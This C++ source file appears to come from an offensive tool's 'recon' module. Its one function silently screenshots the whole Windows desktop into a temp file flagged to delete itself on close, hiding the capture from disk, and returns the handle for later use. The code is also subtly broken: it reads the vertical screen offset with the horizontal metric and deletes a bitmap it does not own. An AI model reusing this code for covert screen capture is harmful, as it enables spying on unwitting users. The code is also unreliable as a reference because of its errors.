//
// Created by diago on 2024-05-25.
//

#include <reconnaissance.hpp>

HANDLE WINAPI recon::save_screenshot() {

    BITMAPFILEHEADER        bf_hdr              = { 0 };
    BITMAPINFOHEADER        bi_hdr              = { 0 };
    BITMAPINFO              bitmap_info         = { 0 };
    BITMAP                  bitmap_alldesktops  = { 0 };
    FILE_DISPOSITION_INFO   file_dispos         = { 0 };

    HGDIOBJ                 hTemp_bitmap = 0;
    HBITMAP                 hBitmap = 0;
    HDC                     hDC = 0, hMemDC = 0;

    long                    width, height;
    uint8_t*                bits = nullptr;

    DWORD                   cb_bits = 0;
    DWORD                   written = 0;

    int                     x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int                     y = GetSystemMetrics(SM_XVIRTUALSCREEN);

    char temp_directory[MAX_PATH] = { 0 };
    char temp_filename[MAX_PATH] = { 0 };
    HANDLE hFile = nullptr; //output file.

    //------------------------------------------------------------------------------//

    if(!GetTempPathA(MAX_PATH, temp_directory)) {
        return nullptr;
    }

    if(!GetTempFileNameA(temp_directory, "POO", 0, temp_filename)) {
        return nullptr;
    }

    hFile = CreateFileA(
        temp_filename,
        FILE_GENERIC_READ | FILE_GENERIC_WRITE | DELETE,
        FILE_SHARE_READ,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if(hFile == INVALID_HANDLE_VALUE) {
        return nullptr;
    }

    file_dispos.DeleteFile = TRUE;
    if(!SetFileInformationByHandle(
        hFile,
        FileDispositionInfo,
        &file_dispos,
        sizeof(file_dispos)
    )) {
        return nullptr;
    }

    //------------------------------------------------------------------------------//

    hDC = GetDC(nullptr);
    hTemp_bitmap = GetCurrentObject(hDC, OBJ_BITMAP);
    GetObjectW(hTemp_bitmap, sizeof(BITMAP), &bitmap_alldesktops);

    width =  bitmap_alldesktops.bmWidth;
    height = bitmap_alldesktops.bmHeight;

    DeleteObject(hTemp_bitmap);

    bf_hdr.bfType           = (WORD)('B' | ('M' << 8));
    bf_hdr.bfOffBits        = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bi_hdr.biSize           = sizeof(BITMAPINFOHEADER);
    bi_hdr.biBitCount       = 24;
    bi_hdr.biCompression    = BI_RGB;
    bi_hdr.biPlanes         = 1;
    bi_hdr.biWidth          = width;
    bi_hdr.biHeight         = height;
    bitmap_info.bmiHeader   = bi_hdr;

    cb_bits = (((24 * width + 31) & ~31) / 8) * height; //.....

    hMemDC = CreateCompatibleDC(hDC);
    hBitmap = CreateDIBSection(hDC, &bitmap_info, DIB_RGB_COLORS, (void**)&bits, nullptr, 0);
    SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, width, height, hDC, x, y, SRCCOPY);

    //------------------------------------------------------------------------------//

    WriteFile(hFile, &bf_hdr, sizeof(BITMAPFILEHEADER), &written, nullptr);
    WriteFile(hFile, &bi_hdr, sizeof(BITMAPINFOHEADER), &written, nullptr);
    WriteFile(hFile, bits, cb_bits, &written, nullptr);
    FlushFileBuffers(hFile);

    DeleteDC(hMemDC);
    ReleaseDC(nullptr, hDC);
    DeleteObject(hBitmap);

    return hFile;
}
